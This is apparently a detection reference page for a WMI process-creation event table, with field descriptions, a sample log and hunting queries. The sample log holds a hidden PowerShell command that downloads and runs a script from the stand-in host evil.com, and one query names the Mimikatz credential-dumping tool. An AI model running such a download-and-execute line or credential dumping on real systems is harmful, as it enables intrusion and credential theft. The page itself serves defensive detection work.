## WmiCreateProcess Table: WMI Process Creation Event

### 1. Table Name
**WmiCreateProcess**

---

### 2. Table Usage
This event is generated when Windows Management Instrumentation (WMI) is used to start a new process. Since WMI is a default service that allows users to remotely manage machines and automate tasks, adversaries often abuse it to install tools, steal credentials, and move laterally within a network. Monitoring this event is useful for tracking an adversary's activity and identifying the origin of an attack during an intrusion.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| CommandLine | The command line used to create the new process. | Windows Only |
| ImageFileName | The full path to the main executable for the created process. | Windows Only |
| UserName | The user name associated with the process creation. | Windows Only |
| RpcClientProcessId | The Process ID (PID) of the RPC client that initiated the request. | Windows Only |
| AuthenticationId | The Logon ID for the token that created the process. Common values include SYSTEM (999) and NETWORK_SERVICE (996). | Windows Only |
| TokenType | The type of token associated with the process, such as a Primary (1) or Impersonation (2) token. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\powershell.exe",
  "CommandLine": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('[http://evil.com/payload.ps1](http://evil.com/payload.ps1)')\"",
  "UserName": "NT AUTHORITY\\SYSTEM",
  "RpcClientProcessId": "1234",
  "AuthenticationId": "999",
  "TokenType": "1"
}
```

### 5. Example Queries
```xql
// Find WMI process creation events involving PowerShell
event_simpleName=WmiCreateProcess ImageFileName="*\\powershell.exe"

// Search for specific commands executed via WMI, such as credential dumping tools
event_simpleName=WmiCreateProcess CommandLine="*Invoke-Mimikatz*"

// Find processes created via WMI by a specific user
event_simpleName=WmiCreateProcess UserName="*Admin*"

// Investigate WMI activity originating from a specific RPC client process ID
event_simpleName=WmiCreateProcess RpcClientProcessId="1234"
```
---
